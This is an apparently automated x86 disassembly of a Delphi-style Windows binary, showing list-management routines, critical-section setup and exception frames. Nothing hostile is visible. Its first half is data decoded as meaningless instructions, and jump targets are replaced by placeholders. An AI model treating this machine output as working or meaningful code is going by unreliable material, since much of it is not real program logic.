lodsb [ esi ]
inc ecx
add [ eax ] cl
mov cl 0x41
add [ ecx + esi * 4 ] ah
inc ecx
add [ eax ] ch
mov ah 0x41
add [ edx + esi * 4 + 0x41 ] ch
add [ eax - 0x4a ] cl
inc ecx
add [ eax - 0x4a ] bl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
movsb [ edi ] [ esi ]
mov ah 0x41
add [ eax ] al
mov ch 0x41
add [ edx + 0x41 ] dl
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] bh
mov al 0x41
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebx + 0x41 ] bh
push ebx
je r-xdata
popad
add [ edi + esi * 4 - 0x4853ffbf ] dl
inc ecx
add [ eax - 0x7fffbfcc ] al
xor al 0x40
add [ eax + edi * 4 + 0x41 ] cl
add al dl
mov eax 0x54070041
push ebx
je r-xdata
dec eax
mov bh 0x41
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
in al dx
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
add [ eax ] al
or edx [ esi + eax * 2 + 0x69 ]
insb
push ebx
je r-xdata
popad
insd
mov eax eax
cmp [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jpe r-xdata
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
je r-xdata
popad
insd
mov eax eax
or [ ebx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] ah
inc ecx
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 2 + 0x41 ] cl
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax - 0x49 ] cl
inc ecx
add [ edi + esi * 4 - 0x4853ffbf ] dl
inc ecx
add [ ebp + edi * 4 + 0x34800041 ] bh
inc eax
add ah dh
mov ebp 0xb8d00041
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc00417a ] ch
add [ eax ] al
add [ ecx + edi * 2 + 0x48980041 ] bh
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x480041bd ] al
mov bh 0x41
add [ ebx + edi * 4 - 0x445fffbf ] cl
inc ecx
add [ eax - 0x45 ] al
inc ecx
add [ eax - 0x45 ] dl
inc ecx
add [ eax + edi * 4 + 0x41 ] cl
add [ eax - 0x45 ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
jb r-xdata
jae r-xdata
inc ecx
add al dl
mov eax 0xbfac0041
insd
dec ebp
insd
outsd
jb r-xdata
inc ecx
add [ 0x6d654d54 ] cl
sar [ eax - 0x4053ffbf ] 0x1
add [ eax - 0x45 ] ah
inc ecx
add [ 0x6e614854 ] cl
insb
insd
or [ edx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 ] ah
inc ecx
add [ eax ] cl
add [ eax ] al
add [ ecx + edi * 2 + 0x41 ] cl
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax - 0x49 ] cl
inc ecx
add [ ebx + edi * 4 - 0x445fffbf ] cl
inc ecx
add [ eax - 0x45 ] al
inc ecx
add [ eax - 0x45 ] dl
inc ecx
add [ eax + edi * 4 + 0x41 ] cl
popad
add [ ebp + 0x79980040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x40041 ] dh
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
add [ eax + edx + 0x40040 ] dl
push ebx
jns r-xdata
push ebx
je r-xdata
sar [ eax + 0x540f0041 ] 0x1
push edx
jae r-xdata
add [ eax ] bl
add [ eax ] al
add [ edx + edi * 2 + 0x48980041 ] bh
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x3d ] al
inc ecx
add [ eax - 0x49 ] cl
inc ecx
add [ edi + esi * 4 - 0x4853ffbf ] dl
inc ecx
add [ ebp + edi * 4 - 0x3c8fffbf ] bh
inc ecx
add ah dh
mov ebp 0xb8d00041
inc ecx
add [ edi ] cl
push esp
add [ ecx ] al
add [ eax ] al
popad
insd
mov eax eax
add [ ecx + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x7c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
jl r-xdata
add [ eax ] al
or eax 0x72745354
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
mov [ ecx + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jl r-xdata
dec eax
mov bh 0x41
je r-xdata
outsd
jb r-xdata
insd
popad
insd
test [ ebx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x140041 ] ah
add [ eax ] al
mov esp 0x9800417a
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x480041be ] cl
mov bh 0x41
add [ eax - 0x53ffbe41 ] al
mov bh 0x41
add [ ebp + edi * 4 - 0x3fd3ffbf ] bh
inc ecx
add ah dh
mov ebp 0xb8d00041
inc ecx
add [ edi + edi * 4 + 0x540d0041 ] ch
dec ebp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ eax ] al
sar [ eax + 0xe0041 ] 0x1
add [ eax + eax ] cl
add [ eax ] al
dec esp
jns r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
add al al
rol [ ecx ] 0xac
mov bh 0x41
add al al
rol [ ecx ] 0x0
rol [ ecx ] 0x38
rol [ ecx ] 0xd0
mov eax 0xe0041
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax - 0x49 ] cl
inc ecx
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_417dcc
cmpsb [ esi ] [ edi ]
jge r-xdata
sub al 0xb
inc edx
add [ ebx + ecx + 0x42 ] ah
add ah cl
or eax [ edx ]
xor al 0xc
inc edx
add [ eax + 0x1c00420c ] bh
or eax 0xf240042
inc edx
add [ eax ] dh
cmovb eax [ eax ]
cmp al 0xf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7e ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
pop esp
jg r-xdata
add [ eax ] ch
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jg r-xdata
jb r-xdata
add al 0x46
inc eax
add [ eax - 0x7ffbe36 ] bh
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x417f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jle r-xdata
pushfd
jle r-xdata
inc edx
add [ eax + 0xf ] cl
inc edx
add [ edi + ecx + 0x42 ] dl
add al dl
cmovb eax [ eax ]
push cs
push esp
push ebx
je r-xdata
xor [ edi ] cl
inc edx
add [ edi + ecx ] bh
add [ eax ] bl
add [ eax ] al
add ah ah
adc [ eax ] eax
cwde
dec eax
inc eax
add [ eax + esi * 2 + 0x70980040 ] cl
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax + 0x4004070 ] ch
inc esi
inc eax
add [ ebx + ecx ] ch
add al 0x46
inc eax
add [ esi + ecx * 4 + 0x41 ] dh
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x80041 ] bl
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x73ffbe81 ] bl
add [ eax ] al
add [ esi + edi * 2 + 0x48980041 ] ch
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi + 0x41 ] bh
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add al bh
jle r-xdata
inc eax
add al dl
retn
add al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_418420
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_407734
pop edi
pop esi
pop ebx
retn
sub_418448
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_407718
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_418470
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_407754
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_418568
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_419898
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_40487c
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_40487c
test al al
je r-xdata
sub_4185c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_418568
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418568
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_40487c
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_418638
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_419740
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_418694
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
mov eax [ esi + 0x4 ]
call sub_404650
mov eax [ esi + 0x8 ]
call sub_404650
mov eax [ esi + 0xc ]
call sub_404650
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4186d4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
xor edi edi
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
inc ebp
xor esi esi
mov edx esi
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebp
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419898
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_404544
test al al
jne r-xdata
sub_41873c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_419898
mov edx eax
mov eax ebp
call sub_40487c
test al al
jne r-xdata
sub_418780
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418830
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404530
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_405794
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4186d4
test eax eax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419740
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418837
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x4 ] eax
sub_418840
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4198f4
test eax eax
setge al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_418864
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_406998
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_418884
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_419898
mov edx edi
call sub_418864
test al al
je r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41978c
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_419898
mov edx edi
call sub_418864
test al al
je r-xdata
mov ebx eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41978c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_418864
test al al
je r-xdata
sub_418930
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_419898
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_41873c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_41897c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_418638
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_419740
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4189f0
push ebx
push esi
push edi
push ebp
call sub_404a1c
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_404640
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4049c4
inc esi
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_419898
call sub_404650
inc edi
dec esi
jne r-xdata
sub_418a50
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_419898
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4185c8
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_418a94
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4186d4
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_419898
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_418ad8
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_418b5b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404530
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b62
lea eax [ ebp - 0x10c ]
call sub_405530
retn
sub_418b68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418a50
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_41855c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_418ad8
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_419898
mov ebx eax
cmp ebx [ ebp - 0x10 ]
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419898
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40487c
test al al
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_418a50
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41978c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_419740
sub_418c58
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_419898
mov edx ebp
call sub_418840
test al al
jne r-xdata
sub_418c9c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_418638
mov edx eax
mov eax [ edi + 0x4 ]
call sub_419740
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_419898
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4198f4
test eax eax
jge r-xdata
sub_418cf8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_419898
mov esi eax
mov edx ebp
mov eax esi
call sub_418884
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_404650
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41978c
sub_418d48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_418e47
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_404974
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e4e
mov eax [ rw-data ]
call sub_418cec
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_419740
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_419898
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41873c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_419740
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_419898
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_418e4e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_418e74
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
